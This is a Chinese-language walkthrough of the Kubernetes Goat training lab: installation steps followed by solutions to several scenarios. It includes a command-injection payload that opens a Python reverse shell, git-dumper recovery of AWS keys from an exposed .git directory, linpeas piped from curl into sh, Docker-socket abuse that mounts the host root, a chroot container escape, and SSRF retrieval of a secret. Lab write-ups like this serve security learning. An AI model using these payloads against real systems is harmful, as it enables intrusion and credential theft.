# kubernetes-goat
## 简介
Kubernetes Goat 是一个交互式 Kubernetes 安全学习游乐场。它在设计场景中故意易受攻击，以展示 Kubernetes 集群、容器和云原生环境中的常见错误配置、现实漏洞和安全问题。
Kubernetes Goat 有 20 多个场景，涵盖攻击、防御、最佳实践、工具等，包括：
- 代码库中敏感密钥
- Docker-in-Docker的漏洞利用
- Kubernetes (K8S) 中的 SSRF
- 容器逃逸到主系统
- Docker CIS 基准分析
- Kubernetes CIS 基准分析
- 攻击私有仓库
- NodePort 暴露的服务
- Helm v2 tiller 攻击集群（已废弃）
- 分析加密矿工容器
- Kubernetes 命名空间绕过
- 获取环境信息
- 拒绝服务（DoS）内存/CPU资源
- 黑客容器预览
- 隐藏在层中
- RBAC 最低特权配置错误
- KubeAudit - 审核Kubernetes集群
- Falco - 运行时安全监测和检测
- Popeye - Kubernetes集群清理工具
- 使用 NSP 保护网络边界
## 安装
> 需要先安装minikube，参考[这里](https://icybersec.gitbook.io/cybersecuritynote-cn/yun-wei-pei-zhi/kubernetes/an-zhuang-bu-shu)安装
### helm
安装helm
```sh
root@l-virtual-machine:~# curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
```
验证helm是否安装完成。
```sh
root@l-virtual-machine:~# helm version
version.BuildInfo{Version:"v3.11.0", GitCommit:"472c5736ab01133de504a826bd9ee12cbe4e7904", GitTreeState:"clean", GoVersion:"go1.18.10"}
```
### Kubernetes Goat
安装socat，用于端口转发
```
apt install -y socat
```
下载kubernetes-goat仓库
```
git clone https://github.com/madhuakula/kubernetes-goat.git
```
进入kubernetes-goat目录
```
cd kubernetes-goat
```
修改`scenarios/internal-proxy/deployment.yaml`中CPU和内存值为300M。
```
spec:
  selector:
    matchLabels:
      app: internal-proxy
  template:
    metadata:
      labels:
        app: internal-proxy
    spec:
      containers:
      - name: internal-api
        image: madhuakula/k8s-goat-internal-api
        resources:
          limits:
            cpu: 300m
            memory: 300Mi
          requests:
            cpu: 300m
            memory: 300Mi
        ports:
```
运行kubernetes-goat的K8S服务
```sh
$ bash setup-kubernetes-goat.sh
```
运行脚本，启动应用服务的端口转发。
```sh
$ bash access-kubernetes-goat.sh
```
访问1234端口，就可以看到全部的场景信息。
![image-20230131103332657](../../.gitbook/assets/image-20230131103332657.png)
## 代码库敏感密钥
开发人员倾向于将敏感信息提交给版本控制系统。当我们转向 CI/CD 和 GitOps 系统时，我们往往会忘记识别代码和提交中的敏感信息。让我们看看能不能在这里找到一些很酷的东西！
访问1230端口。
![image-20230131112130039](../../.gitbook/assets/image-20230131112130039.png)
使用gobuster爆破目录，找到`/.git/HEAD`
```
┌──(root㉿kali)-[/tmp]
└─# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 30 -u http://192.168.32.130:1230
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.32.130:1230
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/ping                 (Status: 200) [Size: 4] 
```
使用`git-dumper`下载源码
```sh
$ git clone https://github.com/arthaud/git-dumper
```
```bash
$ cd git-dumper
$ python3 git_dumper.py http://192.168.32.130:1230/.git  k8s-goat-git
[-] Testing http://192.168.32.130:1230/.git/HEAD [200]
[-] Testing http://192.168.32.130:1230/.git/ [404]
[-] Fetching common files
[-] Fetching http://192.168.32.130:1230/.gitignore [404]
[-] http://192.168.32.130:1230/.gitignore responded with status code 404
[-] Fetching http://192.168.32.130:1230/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.32.130:1230/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.32.130:1230/.git/hooks/post-commit.sample [404]
[-] http://192.168.32.130:1230/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://192.168.32.130:1230/.git/hooks/post-receive.sample [404]
[-] Fetching http://192.168.32.130:1230/.git/hooks/post-update.sample [200]
[-] http://192.168.32.130:1230/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://192.168.32.130:1230/.git/hooks/pre-rebase.sample [200]
```
查看日志和以前的提交历史来验证 git 历史和信息
```sh
$ cd k8s-goat-git
$ git log
```
![image-20230203171234734](../../.gitbook/assets/image-20230203171234734.png)
查看`d7c173ad183c574109cd5c4c648ffe551755b576`commit
```sh
$ git checkout d7c173ad183c574109cd5c4c648ffe551755b576
Note: switching to 'd7c173ad183c574109cd5c4c648ffe551755b576'.
```
查看目录，找到`.env`文件，发现AWS密钥
![image-20230203171254243](../../.gitbook/assets/image-20230203171254243.png)
## Docker-in-Docker的漏洞利用
根据提示，访问1231端口
![image-20230203171912830](../../.gitbook/assets/image-20230203171912830.png)
这是一个命令注入漏洞的页面
![image-20230203171951558](../../.gitbook/assets/image-20230203171951558.png)
配置反弹shell
```
127.0.0.1;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.32.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![image-20230203174412937](../../.gitbook/assets/image-20230203174412937.png)
切换交互式终端
```
# python  -c "import pty;pty.spawn('/bin/bash')"
root@health-check-deployment-fbc7964bc-5l6sx:/# 
```
运行linepeas枚举系统
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
找到docker sock接口
![image-20230203175307779](../../.gitbook/assets/image-20230203175307779.png)
查看版本
![image-20230203175429237](../../.gitbook/assets/image-20230203175429237.png)
下载docker二进制版本
```
wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz -O /tmp/docker-19.03.9.tgz
```
解压
```
tar -xvzf /tmp/docker-19.03.9.tgz -C /tmp/
```
使用docker调用sock
```
/tmp/docker/docker -H unix:///custom/docker/docker.sock images
```
![image-20230203175847619](../../.gitbook/assets/image-20230203175847619.png)
> docker提权到宿主机
>
> ```
> /tmp/docker/docker -H unix:///custom/docker/docker.sock run -v /:/mnt -it alpine  sh
> ```
## Kubernetes (K8S) 中的 SSRF
修改`scenarios/internal-proxy/deployment.yaml`文件应用的内存和CPU值
```
    spec:
      containers:
      - name: internal-api
        image: madhuakula/k8s-goat-internal-api
        resources:
          limits:
            cpu: 300m
            memory: 400Mi
          requests:
            cpu: 300m
            memory: 400Mi
```
访问`http://127.0.0.1:5000`，告诉你访问`http://metadata-db`会有更多的信息。
![image-20230206120146995](../../.gitbook/assets/image-20230206120146995.png)
访问`http://metadata-db`会访问`latest`路径
![image-20230206120311404](../../.gitbook/assets/image-20230206120311404.png)
最后`http://metadata-db/latest/secrets/kubernetes-goat`会得到一个base64值
![image-20230206120404113](../../.gitbook/assets/image-20230206120404113.png)
```bash
$ echo 'azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=' |base64 -d 
k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab
```
## 容器逃逸到主系统
访问1233端口
![image-20230206133959947](../../.gitbook/assets/image-20230206133959947.png)
打印当前系统的进程的 capabilities 状态。capabilities 是指给予进程的特权，用于控制它可以执行哪些操作。
```
root@l-virtual-machine:/# capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```
mount查看挂载，发现`host-system`目录是挂载了宿主机的根目录
![image-20230206134628255](../../.gitbook/assets/image-20230206134628255.png)
查看`/host-system`
![image-20230206135018536](../../.gitbook/assets/image-20230206135018536.png)
将当前系统的根目录更改为 "/host-system"。这意味着系统将认为 "/host-system" 是根目录，并且所有的相对路径都是从 "/host-system" 开始的。执行 "chroot /host-system bash" 后，您将进入到一个以 "/host-system" 为根目录的新环境，并且可以在其中运行 bash。
```
chroot /host-system bash
```
执行`docker ps`
![image-20230206135334606](../../.gitbook/assets/image-20230206135334606.png)
使用kubectl获取pods信息
![image-20230206135642044](../../.gitbook/assets/image-20230206135642044.png)
## Docker CIS 基线分析
运行服务
```
kubectl apply -f scenarios/docker-bench-security/deployment.yaml
```
运行容器应用
```
root@l-virtual-machine:/opt/kubernetes-goat# kubectl get pods
NAME                                               READY   STATUS              RESTARTS   AGE
batch-check-job-t6mnv                              0/1     Completed           0          6d20h
build-code-deployment-7d8969f879-hf88j             1/1     Running             2          6d20h
docker-bench-security-6npjf                        0/1     ContainerCreating   0          61s
health-check-deployment-fbc7964bc-5l6sx            1/1     Running             2          6d20h
hidden-in-layers-9tld6                             1/1     Running             0          136m
internal-proxy-deployment-5489c8b584-72mhp         2/2     Running             0          123m
kubernetes-goat-home-deployment-655d88c69f-lzb9s   1/1     Running             2          6d20h
metadata-db-86d59569fc-nbtx2                       1/1     Running             2          6d20h
poor-registry-deployment-597b9fb599-tfdzq          1/1     Running             2          6d20h
system-monitor-deployment-5678ccfbc9-tqxsb         1/1     Running             2          6d20h
```
```
kubectl exec -it docker-bench-security-6npjf  -- sh
```